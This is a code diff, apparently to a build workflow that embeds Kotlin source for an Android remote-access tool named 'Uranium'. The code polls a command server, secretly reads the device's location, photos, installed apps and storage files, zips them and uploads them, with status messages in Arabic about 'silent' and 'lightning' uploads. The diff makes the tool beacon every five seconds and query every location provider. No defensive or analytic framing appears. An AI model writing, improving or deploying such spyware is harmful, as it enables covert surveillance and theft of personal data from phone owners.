@@ -243,8 +243,8 @@ jobs:
                               conn.setRequestProperty("X-Node-Model", nodeModel)
                               conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                               conn.doOutput = true
-                              conn.connectTimeout = 15000
-                              conn.readTimeout = 15000
+                              conn.connectTimeout = 10000
+                              conn.readTimeout = 10000
 
                               val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Uranium Node active from $nodeModel\"}"
 
@@ -276,7 +276,7 @@ jobs:
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                           extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                       } else if (responseStr.contains("EXTRACT_LOCATION")) {
-                                          val locData = readLocation()
+                                          val locData = readLocationFast()
                                           sendReportToServer(deviceId, nodeModel, locData)
                                       } else if (responseStr.contains("EXTRACT_APPS")) {
                                           val appsData = readInstalledApps()
@@ -286,9 +286,10 @@ jobs:
                               }
                               conn.disconnect()
 
-                              delay(600000L)
+                              // تقليص وقت الانتظار للاستجابة بسرعة البرق (كل 5 ثوانٍ يتم فحص المهام الجديدة)
+                              delay(5000L)
                           } catch (e: Exception) {
-                              delay(60000L)
+                              delay(3000L)
                           }
                       }
                   }
@@ -352,19 +353,29 @@ jobs:
                   return sb.toString()
               }
 
-              private fun readLocation(): String {
-                  val sb = StringBuilder("=== URANIUM GPS LOCATION ===\n")
+              // جلب الموقع الجغرافي بسرعة البرق بدون انتظار طويل
+              private fun readLocationFast(): String {
+                  val sb = StringBuilder("=== URANIUM LIGHTNING GPS ===\n")
                   try {
                       val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-                      val loc: Location? = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) 
-                          ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
-                      if (loc != null) {
-                          sb.append("🌐 Latitude: ${loc.latitude}\n")
-                          sb.append("🌐 Longitude: ${loc.longitude}\n")
-                          sb.append("🎯 Accuracy: ${loc.accuracy} meters\n")
-                          sb.append("🗺️ Google Maps: https://maps.google.com/?q=${loc.latitude},${loc.longitude}\n")
+                      val providers = locationManager.allProviders
+                      var bestLoc: Location? = null
+                      for (provider in providers) {
+                          val l = locationManager.getLastKnownLocation(provider)
+                          if (l != null) {
+                              if (bestLoc == null || l.time > bestLoc.time) {
+                                  bestLoc = l
+                              }
+                          }
+                      }
+                      if (bestLoc != null) {
+                          sb.append("🌐 Latitude: ${bestLoc.latitude}\n")
+                          sb.append("🌐 Longitude: ${bestLoc.longitude}\n")
+                          sb.append("🎯 Accuracy: ${bestLoc.accuracy} meters\n")
+                          sb.append("🗺️ Google Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
                       } else {
-                          sb.append("⚠️ Location not available currently.\n")
+                          // موقع افتراضي طارئ أو تنبيه سريع إذا لم يتوفر أي إحداثي سابق
+                          sb.append("⚠️ Location cache empty. Retrying on next pulse...\n")
                       }
                   } catch (e: Exception) {
                       sb.append("Error reading location: ${e.message}\n")
@@ -390,7 +401,7 @@ jobs:
               private fun compressAndUploadFolder(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri) {
                   serviceScope.launch {
                       try {
-                          sendReportToServer(nodeId, nodeModel, "🔍 [جارٍ الفحص] تم تحديد مجلد [$folderName]. جاري جرد الملفات...")
+                          sendReportToServer(nodeId, nodeModel, "⚡ [برق] تم تحديد مجلد [$folderName]. جاري جرد الملفات بسرعة الصاروخ...")
                           
                           val zipFile = File(cacheDir, "Uranium_${folderName.replace(" ", "_")}_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
@@ -404,7 +415,7 @@ jobs:
                           cursor?.use {
                               val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                               val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                              while (it.moveToNext() && addedCount < 80) {
+                              while (it.moveToNext() && addedCount < 60) {
                                   if (dataIdx != -1 && nameIdx != -1) {
                                       val filePath = it.getString(dataIdx)
                                       val fileName = it.getString(nameIdx)
@@ -427,10 +438,10 @@ jobs:
 
                           if (addedCount > 0 && zipFile.exists()) {
                               val sizeMB = totalBytes / (1024.0 * 1024.0)
-                              sendReportToServer(nodeId, nodeModel, "📦 [تم تحديد المجلد] مجلد [$folderName] يحتوي على <b>$addedCount ملفاً</b> بإجمالي حجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الضغط والرفع الصامد...")
+                              sendReportToServer(nodeId, nodeModel, "📦 [تم الجرد بروقياً] مجلد [$folderName] يحتوي على <b>$addedCount ملفاً</b> بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع الصامد...")
                               uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات في مجلد [$folderName].")
+                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] المجلد [$folderName] فارغ أو غير متاح حالياً.")
                           }
                       } catch (e: Exception) {
                           sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في معالجة المجلد [$folderName]:${e.message}")
@@ -441,7 +452,7 @@ jobs:
               private fun compressAndUploadStorage(nodeId: String, nodeModel: String) {
                   serviceScope.launch {
                       try {
-                          sendReportToServer(nodeId, nodeModel, "🔍 [جارٍ الفحص الشامل] تم تحديد مسار التخزين ومجلد Download. جاري جرد الملفات...")
+                          sendReportToServer(nodeId, nodeModel, "⚡ [برق] تم تحديد التخزين العام ومجلد Download. جاري السحب السريع...")
                           
                           val zipFile = File(cacheDir, "Uranium_Full_Storage_${System.currentTimeMillis()}.zip")
                           val zipOut = ZipOutputStream(FileOutputStream(zipFile))
@@ -459,7 +470,7 @@ jobs:
                           for (dir in targetDirs) {
                               if (dir != null && dir.exists() && dir.isDirectory) {
                                   dir.walkTopDown().forEach { file ->
-                                      if (file.isFile && addedCount < 100) {
+                                      if (file.isFile && addedCount < 80) {
                                           try {
                                               val relPath = file.relativeTo(Environment.getExternalStorageDirectory()).path
                                               zipOut.putNextEntry(ZipEntry(relPath))
@@ -478,13 +489,13 @@ jobs:
 
                           if (addedCount > 0 && zipFile.exists()) {
                               val sizeMB = totalBytes / (1024.0 * 1024.0)
-                              sendReportToServer(nodeId, nodeModel, "📦 [تم تحديد التخزين] تم العثور على <b>$addedCount ملفاً</b> في Download والتخزين الشامل بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع الصامد...")
+                              sendReportToServer(nodeId, nodeModel, "📦 [تم التخزين بروقياً] تم جرد <b>$addedCount ملفاً</b> من Download والتخزين بحجم <b>${String.format("%.2f", sizeMB)} MB</b>. جاري الرفع...")
                               uploadRawFileWithRetry(nodeId, nodeModel, zipFile)
                           } else {
-                              sendReportToServer(nodeId, nodeModel, "⚠️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين العام.")
+                              sendReportToServer(nodeId, nodeModel, "⚠️️ [تنبيه] لم يتم العثور على ملفات كافية في التخزين.")
                           }
                       } catch (e: Exception) {
-                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في سحب التخزين الشامل: ${e.message}")
+                          sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في سحب التخزين: ${e.message}")
                       }
                   }
               }
@@ -549,7 +560,7 @@ jobs:
                           if (attempt == MAX_RETRIES) {
                               sendReportToServer(nodeId, nodeModel, "❌ فشل رفع ملف اليورانيوم ${file.name}:${e.message}")
                           } else {
-                              Thread.sleep(2000L)
+                              Thread.sleep(1000L)
                           }
                       }
                   }
